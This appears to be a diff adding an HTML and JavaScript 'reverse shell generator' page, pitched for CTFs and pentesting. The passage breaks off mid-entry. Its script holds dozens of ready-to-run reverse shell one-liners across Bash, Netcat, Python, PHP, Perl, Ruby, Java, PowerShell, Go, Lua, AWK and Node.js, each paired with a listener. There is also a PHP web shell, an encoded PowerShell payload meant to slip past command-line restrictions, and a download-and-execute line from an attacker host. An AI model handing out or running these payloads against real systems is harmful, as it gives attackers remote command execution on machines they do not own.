@@ -1,0 +1,730 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>maeitshells</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+:root{
+  --bg:#0d1117;--bg2:#161b22;--bg3:#21262d;--bg4:#30363d;
+  --accent:#58a6ff;--accent2:#3fb950;--accent3:#f78166;--accent4:#d2a8ff;
+  --text:#e6edf3;--text2:#8b949e;--text3:#484f58;
+  --border:#30363d;--border2:#21262d;
+  --red:#f85149;--green:#3fb950;--yellow:#e3b341;--purple:#d2a8ff;--orange:#ffa657;
+  --radius:6px;
+}
+body{background:var(--bg);color:var(--text);font-family:'Segoe UI',system-ui,sans-serif;min-height:100vh;display:flex;flex-direction:column}
+
+/* Header */
+header{background:var(--bg2);border-bottom:1px solid var(--border);padding:.8rem 1.5rem;display:flex;align-items:center;gap:1rem}
+.logo{font-size:1.3rem;font-weight:800;color:var(--accent);letter-spacing:-0.5px;cursor:pointer}
+.logo em{color:var(--accent3);font-style:normal}
+.hdr-sub{color:var(--text2);font-size:.8rem;flex:1}
+.hdr-btns{display:flex;gap:.5rem}
+.hdr-btn{background:var(--bg3);border:1px solid var(--border);color:var(--text2);padding:.35rem .75rem;border-radius:var(--radius);cursor:pointer;font-size:.78rem;transition:.15s}
+.hdr-btn:hover,.hdr-btn.active{background:var(--accent);color:#fff;border-color:var(--accent)}
+
+/* Layout */
+.app{display:flex;flex:1;overflow:hidden;height:calc(100vh - 51px)}
+.sidebar{width:260px;min-width:220px;background:var(--bg2);border-right:1px solid var(--border);display:flex;flex-direction:column;overflow:hidden}
+.main{flex:1;display:flex;flex-direction:column;overflow:hidden}
+
+/* Config bar */
+.config{background:var(--bg2);border-bottom:1px solid var(--border);padding:.8rem 1.2rem;display:flex;flex-wrap:wrap;align-items:center;gap:.6rem}
+.config label{font-size:.75rem;color:var(--text2);white-space:nowrap}
+.config input,.config select{background:var(--bg3);border:1px solid var(--border);color:var(--text);padding:.4rem .7rem;border-radius:var(--radius);font-size:.82rem;outline:none;transition:.15s}
+.config input:focus,.config select:focus{border-color:var(--accent)}
+.config input.ip{width:155px}
+.config input.port{width:70px}
+.config select.shell-sel{width:120px}
+.port-inc{background:var(--bg3);border:1px solid var(--border);color:var(--text2);width:28px;height:28px;border-radius:var(--radius);cursor:pointer;font-size:1rem;display:flex;align-items:center;justify-content:center;transition:.15s;flex-shrink:0}
+.port-inc:hover{background:var(--accent);color:#fff;border-color:var(--accent)}
+.encode-btns{display:flex;gap:.3rem;margin-left:auto}
+.enc-btn{background:var(--bg3);border:1px solid var(--border);color:var(--text2);padding:.3rem .65rem;border-radius:var(--radius);cursor:pointer;font-size:.75rem;transition:.15s}
+.enc-btn:hover,.enc-btn.active{background:var(--accent4);color:#000;border-color:var(--accent4)}
+
+/* Search */
+.search-wrap{padding:.7rem;border-bottom:1px solid var(--border)}
+.search-wrap input{width:100%;background:var(--bg3);border:1px solid var(--border);color:var(--text);padding:.45rem .8rem .45rem 2rem;border-radius:var(--radius);font-size:.82rem;outline:none;background-image:url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='14' height='14' viewBox='0 0 24 24' fill='none' stroke='%238b949e' stroke-width='2'%3E%3Ccircle cx='11' cy='11' r='8'/%3E%3Cpath d='m21 21-4.35-4.35'/%3E%3C/svg%3E");background-repeat:no-repeat;background-position:.6rem center;transition:.15s}
+.search-wrap input:focus{border-color:var(--accent)}
+
+/* OS tabs */
+.os-tabs{display:flex;border-bottom:1px solid var(--border);overflow:hidden}
+.os-tab{flex:1;padding:.45rem .2rem;text-align:center;font-size:.72rem;font-weight:600;cursor:pointer;color:var(--text2);border-bottom:2px solid transparent;transition:.15s;letter-spacing:.03em;text-transform:uppercase}
+.os-tab:hover{color:var(--text)}
+.os-tab.active{color:var(--accent);border-bottom-color:var(--accent)}
+
+/* Shell list */
+.shell-list{flex:1;overflow-y:auto;padding:.4rem}
+.shell-list::-webkit-scrollbar{width:4px}
+.shell-list::-webkit-scrollbar-track{background:transparent}
+.shell-list::-webkit-scrollbar-thumb{background:var(--border)}
+.shell-item{padding:.5rem .7rem;border-radius:var(--radius);cursor:pointer;font-size:.82rem;display:flex;align-items:center;justify-content:space-between;transition:.1s;margin-bottom:2px}
+.shell-item:hover{background:var(--bg3)}
+.shell-item.active{background:var(--bg4);color:var(--accent)}
+.shell-item .name{font-weight:600}
+.shell-item .badge{font-size:.65rem;padding:.1rem .4rem;border-radius:20px;background:var(--bg4);color:var(--text3);border:1px solid var(--border)}
+.shell-item.active .badge{background:rgba(88,166,255,.15);color:var(--accent);border-color:rgba(88,166,255,.3)}
+
+/* Output */
+.output-area{flex:1;display:flex;flex-direction:column;overflow:hidden;padding:1rem}
+.output-header{display:flex;align-items:center;gap:.6rem;margin-bottom:.6rem}
+.output-title{font-size:.9rem;font-weight:700;color:var(--text)}
+.shell-badge{font-size:.7rem;padding:.15rem .5rem;border-radius:20px;border:1px solid var(--border);color:var(--text2)}
+.output-actions{display:flex;gap:.4rem;margin-left:auto}
+.act-btn{background:var(--bg3);border:1px solid var(--border);color:var(--text2);padding:.3rem .65rem;border-radius:var(--radius);cursor:pointer;font-size:.75rem;transition:.15s;white-space:nowrap}
+.act-btn:hover{border-color:var(--accent);color:var(--accent)}
+.act-btn.success{background:var(--green);color:#000;border-color:var(--green)}
+
+.code-block{background:var(--bg2);border:1px solid var(--border);border-radius:var(--radius);padding:1rem 1.2rem;font-family:'Consolas','Fira Code',monospace;font-size:.85rem;color:#a8ff78;line-height:1.6;overflow-x:auto;white-space:pre;flex:0 0 auto;position:relative;min-height:60px}
+.code-block .prompt{color:var(--text3);user-select:none}
+
+.listener-section{margin-top:1rem}
+.listener-label{font-size:.75rem;font-weight:700;text-transform:uppercase;letter-spacing:.08em;color:var(--text2);margin-bottom:.5rem;display:flex;align-items:center;gap:.4rem}
+.listener-label::after{content:'';flex:1;height:1px;background:var(--border)}
+
+.info-bar{background:var(--bg2);border:1px solid var(--border);border-radius:var(--radius);padding:.6rem 1rem;font-size:.78rem;color:var(--text2);margin-top:.8rem;line-height:1.5}
+.info-bar strong{color:var(--accent)}
+
+/* TTY upgrade */
+.tty-section{margin-top:1rem}
+.tty-header{font-size:.75rem;font-weight:700;text-transform:uppercase;letter-spacing:.08em;color:var(--yellow);margin-bottom:.5rem;display:flex;align-items:center;gap:.4rem;cursor:pointer}
+.tty-header::after{content:'';flex:1;height:1px;background:var(--border)}
+.tty-steps{display:flex;flex-direction:column;gap:.4rem}
+.tty-step{background:var(--bg2);border:1px solid var(--border);border-radius:var(--radius);padding:.5rem 1rem;font-family:'Consolas','Fira Code',monospace;font-size:.8rem;color:#ffd700;position:relative;cursor:pointer;transition:.1s}
+.tty-step:hover{border-color:var(--yellow)}
+.tty-step .step-copy{position:absolute;right:.5rem;top:50%;transform:translateY(-50%);background:var(--bg3);border:1px solid var(--border);color:var(--text2);padding:.15rem .4rem;border-radius:3px;font-size:.65rem;cursor:pointer;opacity:0;transition:.15s;font-family:inherit}
+.tty-step:hover .step-copy{opacity:1}
+.tty-step .step-copy:hover{background:var(--yellow);color:#000}
+
+.empty-state{flex:1;display:flex;flex-direction:column;align-items:center;justify-content:center;color:var(--text3);gap:.5rem}
+.empty-state .icon{font-size:2.5rem;opacity:.4}
+
+/* Scrollbar */
+.output-area::-webkit-scrollbar{width:4px}
+.output-area::-webkit-scrollbar-track{background:transparent}
+.output-area::-webkit-scrollbar-thumb{background:var(--border)}
+
+/* Footer */
+footer{background:var(--bg2);border-top:1px solid var(--border);padding:.5rem 1.5rem;font-size:.72rem;color:var(--text3);text-align:center}
+
+/* Responsive */
+@media(max-width:680px){
+  .sidebar{width:200px}
+  .config{gap:.4rem}
+  .config input.ip{width:120px}
+}
+</style>
+</head>
+<body>
+
+<header>
+  <div class="logo">maeit<em>shells</em></div>
+  <div class="hdr-sub">maeitshells — Reverse Shell Generator — Great for CTFs &amp; Pentesting</div>
+  <div class="hdr-btns">
+    <button class="hdr-btn active" id="btn-dark" onclick="setTheme('dark')">Dark</button>
+    <button class="hdr-btn" id="btn-light" onclick="setTheme('light')">Light</button>
+  </div>
+</header>
+
+<div class="app">
+  <!-- Sidebar -->
+  <aside class="sidebar">
+    <div class="search-wrap">
+      <input type="text" id="shell-search" placeholder="Search shells…" oninput="filterShells()">
+    </div>
+    <div class="os-tabs">
+      <div class="os-tab active" onclick="setOS('all',this)">All</div>
+      <div class="os-tab" onclick="setOS('linux',this)">Linux</div>
+      <div class="os-tab" onclick="setOS('windows',this)">Windows</div>
+      <div class="os-tab" onclick="setOS('mac',this)">macOS</div>
+    </div>
+    <div class="shell-list" id="shell-list"></div>
+  </aside>
+
+  <!-- Main -->
+  <div class="main">
+    <!-- Config bar -->
+    <div class="config">
+      <label>IP</label>
+      <input class="ip" type="text" id="ip" value="10.10.10.10" oninput="regenerate()">
+      <label>Port</label>
+      <input class="port" type="number" id="port" value="4444" oninput="regenerate()">
+      <button class="port-inc" onclick="incPort()" title="Increment port">+</button>
+      <label>Shell</label>
+      <select class="shell-sel" id="shell-type" onchange="regenerate()">
+        <option value="/bin/sh">/bin/sh</option>
+        <option value="/bin/bash" selected>/bin/bash</option>
+        <option value="/bin/zsh">/bin/zsh</option>
+        <option value="powershell">powershell</option>
+        <option value="cmd.exe">cmd.exe</option>
+      </select>
+      <div class="encode-btns">
+        <button class="enc-btn" id="enc-none" onclick="setEnc('none')" title="No encoding">None</button>
+        <button class="enc-btn" id="enc-uri" onclick="setEnc('uri')" title="URI encode">URL</button>
+        <button class="enc-btn" id="enc-b64" onclick="setEnc('b64')" title="Base64 encode">B64</button>
+      </div>
+    </div>
+
+    <!-- Output -->
+    <div class="output-area" id="output-area">
+      <div class="empty-state" id="empty-state">
+        <div class="icon">🐚</div>
+        <div>Select a shell from the left panel</div>
+        <div style="font-size:.75rem">Configure IP, Port, and Shell type above</div>
+      </div>
+      <div id="shell-output" style="display:none">
+        <div class="output-header">
+          <div class="output-title" id="out-title">—</div>
+          <span class="shell-badge" id="out-badge">—</span>
+          <div class="output-actions">
+            <button class="act-btn" id="copy-btn" onclick="copyShell()">📋 Copy</button>
+            <button class="act-btn" onclick="downloadShell()">💾 Save</button>
+          </div>
+        </div>
+        <div class="code-block" id="out-code"></div>
+
+        <div class="listener-section">
+          <div class="listener-label">Listener</div>
+          <div class="code-block" id="out-listener" style="color:#79c0ff"></div>
+        </div>
+
+        <div class="info-bar" id="out-info"></div>
+
+        <div class="tty-section" id="tty-section">
+          <div class="tty-header" onclick="toggleTTY()">⬆ TTY Upgrade Steps (Linux)</div>
+          <div class="tty-steps" id="tty-steps">
+            <div class="tty-step">python3 -c 'import pty; pty.spawn("/bin/bash")'<button class="step-copy" onclick="event.stopPropagation();copyStep(this)">copy</button></div>
+            <div class="tty-step">Ctrl+Z (background the shell)<button class="step-copy" onclick="event.stopPropagation();copyStep(this)">copy</button></div>
+            <div class="tty-step">stty raw -echo; fg<button class="step-copy" onclick="event.stopPropagation();copyStep(this)">copy</button></div>
+            <div class="tty-step">export TERM=xterm-256color<button class="step-copy" onclick="event.stopPropagation();copyStep(this)">copy</button></div>
+            <div class="tty-step">stty rows 50 columns 200<button class="step-copy" onclick="event.stopPropagation();copyStep(this)">copy</button></div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<footer>maeitshells &mdash; All shell generation happens client-side. No data is sent to any server.</footer>
+
+<script>
+// ─── SHELL DATABASE ───────────────────────────────────────────────────────────
+// [id, name, os, category, fn(ip,port,shell), listener_fn(port), info]
+const SHELLS = [
+  // ── BASH ──
+  {id:'bash-i',name:'Bash -i',os:'linux',cat:'Bash',
+    fn:(ip,port,sh)=>`bash -i >& /dev/tcp/${ip}/${port} 0>&1`,
+    listener:p=>`nc -lvnp ${p}`,
+    info:'Classic bash reverse shell using /dev/tcp. Works on most Linux systems with bash.'
+  },
+  {id:'bash-196',name:'Bash 196',os:'linux',cat:'Bash',
+    fn:(ip,port,sh)=>`0<&196;exec 196<>/dev/tcp/${ip}/${port}; sh <&196 >&196 2>&196`,
+    listener:p=>`nc -lvnp ${p}`,
+    info:'Bash reverse shell using file descriptor 196. Useful when >& is filtered.'
+  },
+  {id:'bash-read',name:'Bash readline',os:'linux',cat:'Bash',
+    fn:(ip,port,sh)=>`exec 5<>/dev/tcp/${ip}/${port}; while read line 0<&5; do $line 2>&5 >&5; done`,
+    listener:p=>`nc -lvnp ${p}`,
+    info:'Read-line based bash shell using file descriptor 5.'
+  },
+  {id:'bash-5',name:'Bash 5',os:'linux',cat:'Bash',
+    fn:(ip,port,sh)=>`bash -i 5<>/dev/tcp/${ip}/${port} 0<&5 1>&5 2>&5`,
+    listener:p=>`nc -lvnp ${p}`,
+    info:'Bash reverse shell via file descriptor 5.'
+  },
+  {id:'bash-udp',name:'Bash UDP',os:'linux',cat:'Bash',
+    fn:(ip,port,sh)=>`sh -i >& /dev/udp/${ip}/${port} 0>&1`,
+    listener:p=>`nc -u -lvnp ${p}`,
+    info:'UDP-based reverse shell. Useful when TCP traffic is filtered.'
+  },
+  // ── NC ──
+  {id:'nc-e',name:'Netcat -e',os:'linux',cat:'Netcat',
+    fn:(ip,port,sh)=>`nc ${ip} ${port} -e ${sh}`,
+    listener:p=>`nc -lvnp ${p}`,
+    info:'Netcat with -e flag. Requires a Netcat version that supports -e (traditional/ncat).'
+  },
+  {id:'nc-mkfifo',name:'Netcat mkfifo',os:'linux',cat:'Netcat',
+    fn:(ip,port,sh)=>`rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | ${sh} -i 2>&1 | nc ${ip} ${port} >/tmp/f`,
+    listener:p=>`nc -lvnp ${p}`,
+    info:'Named pipe trick for netcat versions without -e. Works on most Linux systems.'
+  },
+  {id:'nc-e-win',name:'Netcat -e (Windows)',os:'windows',cat:'Netcat',
+    fn:(ip,port,sh)=>`nc.exe ${ip} ${port} -e cmd.exe`,
+    listener:p=>`nc -lvnp ${p}`,
+    info:'Windows netcat with -e. Requires nc.exe to be present on the target.'
+  },
+  {id:'nc-bsd',name:'Netcat BSD',os:'linux',cat:'Netcat',
+    fn:(ip,port,sh)=>`rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${ip} ${port} >/tmp/f`,
+    listener:p=>`nc -lvnp ${p}`,
+    info:'BSD netcat variant without -e support, using a named pipe.'
+  },
+  {id:'busybox-nc',name:'BusyBox nc',os:'linux',cat:'Netcat',
+    fn:(ip,port,sh)=>`busybox nc ${ip} ${port} -e ${sh}`,
+    listener:p=>`nc -lvnp ${p}`,
+    info:'BusyBox netcat (common on embedded Linux, Alpine, etc.).'
+  },
+  // ── PYTHON ──
+  {id:'py3',name:'Python3',os:'linux',cat:'Python',
+    fn:(ip,port,sh)=>`python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("${ip}",${port}));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("${sh}")'`,
+    listener:p=>`nc -lvnp ${p}`,
+    info:'Python3 reverse shell with pty.spawn for a fully interactive TTY.'
+  },
+  {id:'py3-short',name:'Python3 Short',os:'linux',cat:'Python',
+    fn:(ip,port,sh)=>`python3 -c 'import socket,subprocess;s=socket.socket();s.connect(("${ip}",${port}));subprocess.call(["${sh}"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'`,
+    listener:p=>`nc -lvnp ${p}`,
+    info:'Shorter Python3 reverse shell using subprocess.'
+  },
+  {id:'py2',name:'Python2',os:'linux',cat:'Python',
+    fn:(ip,port,sh)=>`python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${ip}",${port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["${sh}","-i"])'`,
+    listener:p=>`nc -lvnp ${p}`,
+    info:'Python2 reverse shell using dup2 for stdin/stdout/stderr redirection.'
+  },
+  {id:'py2-win',name:'Python2 (Windows)',os:'windows',cat:'Python',
+    fn:(ip,port,sh)=>`python -c "import socket,subprocess,os;s=socket.socket();s.connect(('${ip}',${port}));[os.dup2(s.fileno(),x)for x in(0,1,2)];subprocess.call(['cmd.exe'])"`,
+    listener:p=>`nc -lvnp ${p}`,
+    info:'Python2 reverse shell for Windows targets.'
+  },
+  {id:'py3-win',name:'Python3 (Windows)',os:'windows',cat:'Python',
+    fn:(ip,port,sh)=>`python3 -c "import socket,subprocess,os;s=socket.socket();s.connect(('${ip}',${port}));[os.dup2(s.fileno(),x)for x in(0,1,2)];subprocess.call(['cmd.exe'])"`,
+    listener:p=>`nc -lvnp ${p}`,
+    info:'Python3 reverse shell for Windows targets.'
+  },
+  // ── PHP ──
+  {id:'php-exec',name:'PHP exec',os:'linux',cat:'PHP',
+    fn:(ip,port,sh)=>`php -r '$sock=fsockopen("${ip}",${port});exec("${sh} -i <&3 >&3 2>&3");'`,
+    listener:p=>`nc -lvnp ${p}`,
+    info:'PHP reverse shell using fsockopen and exec. Requires PHP CLI.'
+  },
+  {id:'php-shell-exec',name:'PHP shell_exec',os:'linux',cat:'PHP',
+    fn:(ip,port,sh)=>`php -r '$sock=fsockopen("${ip}",${port});shell_exec("${sh} -i <&3 >&3 2>&3");'`,
+    listener:p=>`nc -lvnp ${p}`,
+    info:'PHP reverse shell using shell_exec function.'
+  },
+  {id:'php-system',name:'PHP system',os:'linux',cat:'PHP',
+    fn:(ip,port,sh)=>`php -r '$sock=fsockopen("${ip}",${port});system("${sh} -i <&3 >&3 2>&3");'`,
+    listener:p=>`nc -lvnp ${p}`,
+    info:'PHP reverse shell using system().'
+  },
+  {id:'php-passthru',name:'PHP passthru',os:'linux',cat:'PHP',
+    fn:(ip,port,sh)=>`php -r '$sock=fsockopen("${ip}",${port});passthru("${sh} -i <&3 >&3 2>&3");'`,
+    listener:p=>`nc -lvnp ${p}`,
+    info:'PHP reverse shell using passthru().'
+  },
+  {id:'php-popen',name:'PHP popen',os:'linux',cat:'PHP',
+    fn:(ip,port,sh)=>`php -r '$proc=popen("${sh} -i",r);$sock=fsockopen("${ip}",${port});stream_copy_to_stream($proc,$sock);'`,
+    listener:p=>`nc -lvnp ${p}`,
+    info:'PHP reverse shell using popen() — good for bypassing certain PHP hardening.'
+  },
+  {id:'php-web',name:'PHP Web Shell',os:'linux',cat:'PHP',
+    fn:(ip,port,sh)=>`<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/${ip}/${port} 0>&1'");?>`,
+    listener:p=>`nc -lvnp ${p}`,
+    info:'PHP web shell snippet. Upload to webserver and trigger via browser/curl.'
+  },
+  // ── PERL ──
+  {id:'perl',name:'Perl',os:'linux',cat:'Perl',
+    fn:(ip,port,sh)=>`perl -e 'use Socket;$i="${ip}";$p=${port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("${sh} -i");'`,
+    listener:p=>`nc -lvnp ${p}`,
+    info:'Classic Perl reverse shell. Works on most Linux/Unix systems.'
+  },
+  {id:'perl-nosh',name:'Perl nosh',os:'linux',cat:'Perl',
+    fn:(ip,port,sh)=>`perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"${ip}:${port}");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'`,
+    listener:p=>`nc -lvnp ${p}`,
+    info:'Perl reverse shell using IO::Socket without invoking a shell directly.'
+  },
+  {id:'perl-win',name:'Perl (Windows)',os:'windows',cat:'Perl',
+    fn:(ip,port,sh)=>`perl -MIO::Socket -e '$c=IO::Socket::INET->new(PeerAddr=>"${ip}:${port}");open STDIN,"<&$c";open STDOUT,">&$c";open STDERR,">&$c";exec("cmd.exe");'`,
+    listener:p=>`nc -lvnp ${p}`,
+    info:'Perl reverse shell for Windows systems.'
+  },
+  // ── RUBY ──
+  {id:'ruby',name:'Ruby',os:'linux',cat:'Ruby',
+    fn:(ip,port,sh)=>`ruby -rsocket -e 'exit if fork;c=TCPSocket.new("${ip}","${port}");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'`,
+    listener:p=>`nc -lvnp ${p}`,
+    info:'Ruby reverse shell. Works on systems with Ruby installed.'
+  },
+  {id:'ruby-nosh',name:'Ruby nosh',os:'linux',cat:'Ruby',
+    fn:(ip,port,sh)=>`ruby -rsocket -e 'c=TCPSocket.new("${ip}","${port}");$stdin.reopen(c);$stdout.reopen(c);$stderr.reopen(c);exec "${sh} -i"'`,
+    listener:p=>`nc -lvnp ${p}`,
+    info:'Cleaner Ruby reverse shell using reopen for stdin/stdout/stderr.'
+  },
+  {id:'ruby-win',name:'Ruby (Windows)',os:'windows',cat:'Ruby',
+    fn:(ip,port,sh)=>`ruby -rsocket -e 'c=TCPSocket.new("${ip}","${port}");$stdin.reopen(c);$stdout.reopen(c);$stderr.reopen(c);exec "cmd.exe"'`,
+    listener:p=>`nc -lvnp ${p}`,
+    info:'Ruby reverse shell for Windows targets.'
+  },
+  // ── JAVA ──
+  {id:'java-runtime',name:'Java Runtime',os:'linux',cat:'Java',
+    fn:(ip,port,sh)=>`r = Runtime.getRuntime()
+p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/${ip}/${port};cat <&5 | while read line; do \\$line 2>&5 >&5; done"] as String[])
+p.waitFor()`,
+    listener:p=>`nc -lvnp ${p}`,
+    info:'Java reverse shell using Runtime.exec. Useful in script consoles (Jenkins, etc.).'
+  },
+  {id:'java-thread',name:'Java Thread',os:'linux',cat:'Java',
+    fn:(ip,port,sh)=>`String host="${ip}"; int port=${port}; String cmd="${sh}";
+Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try{p.exitValue();break;}catch(Exception e){}}p.destroy();s.close();`,
+    listener:p=>`nc -lvnp ${p}`,
+    info:'Java thread-based reverse shell. Useful in environments allowing arbitrary Java code execution.'
+  },
+  // ── POWERSHELL ──
+  {id:'ps-tcp',name:'PowerShell TCP',os:'windows',cat:'PowerShell',
+    fn:(ip,port,sh)=>`powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("${ip}",${port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`,
+    listener:p=>`nc -lvnp ${p}`,
+    info:'PowerShell TCP reverse shell. Full command execution with PS prompt.'
+  },
+  {id:'ps-base64',name:'PowerShell Base64',os:'windows',cat:'PowerShell',
+    fn:(ip,port,sh)=>{
+      const cmd=`$client = New-Object System.Net.Sockets.TCPClient('${ip}',${port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String);$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`;
+      const b64=btoa(String.fromCharCode(...new TextEncoder().encode(cmd).reduce((a,b,i)=>i%2===0?[...a,b,0]:[...a.slice(0,-1),a[a.length-1],b],[])));
+      return `powershell -e ${b64}`;
+    },
+    listener:p=>`nc -lvnp ${p}`,
+    info:'PowerShell reverse shell encoded as UTF-16LE Base64. Bypasses some cmdline restrictions.'
+  },
+  {id:'ps-nishang',name:'PowerShell Nishang',os:'windows',cat:'PowerShell',
+    fn:(ip,port,sh)=>`powershell iex (New-Object Net.WebClient).DownloadString('http://ATTACKER/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress ${ip} -Port ${port}`,
+    listener:p=>`nc -lvnp ${p}`,
+    info:'Nishang PowerShell reverse shell. Requires hosting Invoke-PowerShellTcp.ps1 on your attacker machine.'
+  },
+  {id:'ps-mini',name:'PowerShell Mini',os:'windows',cat:'PowerShell',
+    fn:(ip,port,sh)=>`powershell -c "$c=New-Object Net.Sockets.TcpClient('${ip}',${port});$s=$c.GetStream();$w=New-Object IO.StreamWriter($s);$r=New-Object IO.StreamReader($s);while($c.Connected){$w.Write('PS> ');$w.Flush();$cmd=$r.ReadLine();if($cmd){try{$out=iex $cmd 2>&1|Out-String}catch{$out=$_};$w.WriteLine($out);$w.Flush()}}"`,
+    listener:p=>`rlwrap nc -lvnp ${p}`,
+    info:'Compact PowerShell reverse shell with prompt. Use rlwrap for better experience.'
+  },
+  // ── SOCAT ──
+  {id:'socat',name:'Socat',os:'linux',cat:'Socat',
+    fn:(ip,port,sh)=>`socat tcp-connect:${ip}:${port} exec:${sh},pty,stderr,setsid,sigint,sane`,
+    listener:p=>`socat file:\`tty\`,raw,echo=0 tcp-listen:${p}`,
+    info:'Socat reverse shell with PTY. Gives a fully interactive shell. Best option when socat is available.'
+  },
+  {id:'socat-quiet',name:'Socat Quiet',os:'linux',cat:'Socat',
+    fn:(ip,port,sh)=>`socat tcp-connect:${ip}:${port} exec:${sh},pty,stderr,setsid,sigint,sane &`,
+    listener:p=>`socat file:\`tty\`,raw,echo=0 tcp-listen:${p}`,
+    info:'Socat reverse shell running in the background.'
+  },
+  // ── GOLANG ──
+  {id:'go',name:'Golang',os:'linux',cat:'Go',
+    fn:(ip,port,sh)=>`echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","${ip}:${port}");cmd:=exec.Command("${sh}");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go &`,
+    listener:p=>`nc -lvnp ${p}`,
+    info:'Golang reverse shell. Compile and run on the target. Useful when Go is installed.'
+  },
+  {id:'go-win',name:'Golang (Windows)',os:'windows',cat:'Go',
+    fn:(ip,port,sh)=>`echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","${ip}:${port}");cmd:=exec.Command("cmd.exe");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > %TEMP%\t.go && go run %TEMP%\t.go`,
+    listener:p=>`nc -lvnp ${p}`,
+    info:'Golang reverse shell for Windows targets.'
+  },
+  // ── LUA ──
+  {id:'lua',name:'Lua',os:'linux',cat:'Lua',
+    fn:(ip,port,sh)=>`lua -e "require('socket');require('os');t=socket.tcp();t:connect('${ip}','${port}');os.execute('${sh} -i <&3 >&3 2>&3');"`,
+    listener:p=>`nc -lvnp ${p}`,
+    info:'Lua reverse shell using the socket library. Common on OpenWRT/embedded systems.'
+  },
+  {id:'lua5.1',name:'Lua 5.1',os:'linux',cat:'Lua',
+    fn:(ip,port,sh)=>`lua5.1 -e 'local host, port = "${ip}", ${port}; local socket = require("socket"); local tcp = socket.tcp(); tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive(); local f = assert(io.popen(cmd, "r")); local s = assert(f:read("*a")); f:close(); tcp:send(s); if status == "closed" then break end end; tcp:close()'`,
+    listener:p=>`nc -lvnp ${p}`,
+    info:'Lua 5.1 reverse shell — interactive command loop.'
+  },
+  // ── AWK ──
+  {id:'awk',name:'AWK',os:'linux',cat:'AWK',
+    fn:(ip,port,sh)=>`awk 'BEGIN {s = "/inet/tcp/0/${ip}/${port}"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null`,
+    listener:p=>`nc -lvnp ${p}`,
+    info:'AWK reverse shell using GNU AWK network extensions. Available on most Linux systems.'
+  },
+  // ── NODE ──
+  {id:'node',name:'Node.js',os:'linux',cat:'Node.js',
+    fn:(ip,port,sh)=>`node -e 'var net=require("net"),cp=require("child_process"),sh=cp.spawn("${sh}",[]);var c=new net.Socket();c.connect(${port},"${ip}",function(){c.pipe(sh.stdin);sh.stdout.pipe(c);sh.stderr.pipe(c)});'`,
+    listener:p=>`nc -lvnp ${p}`,
+    info:'Node.js reverse shell — great for Node.js app servers and CTFs with JS eval.'
+  },
+  {id:'node-win',name:'Node.js (Windows)',os:'windows',cat:'Node.js',
+    fn:(ip,port,sh)=>`node -e "var net=require('net'),cp=require('child_process'),sh=cp.spawn('cmd.exe',[]);var c=new net.Socket();c.connect(${port},'${ip}',function(){c.pipe(sh.stdin);sh.stdout.pipe(c);sh.stderr.pipe(c)});"`,
+    listener:p=>`nc -lvnp ${p}`,
+    info:'Node.js reverse shell for Windows targets using cmd.exe.'
+  },
+  // ── TELNET ──
+  {id:'telnet',name:'Telnet',os:'linux',cat:'Telnet',
+    fn:(ip,port,sh)=>`TF=$(mktemp -u); mkfifo $TF && telnet ${ip} ${port} 0<$TF | ${sh} 1>$TF`,
+    listener:p=>`nc -lvnp ${p}`,
+    info:'Telnet reverse shell using a named pipe. Fallback when other tools are unavailable.'
+  },
+  {id:'telnet-2port',name:'Telnet 2-Port',os:'linux',cat:'Telnet',
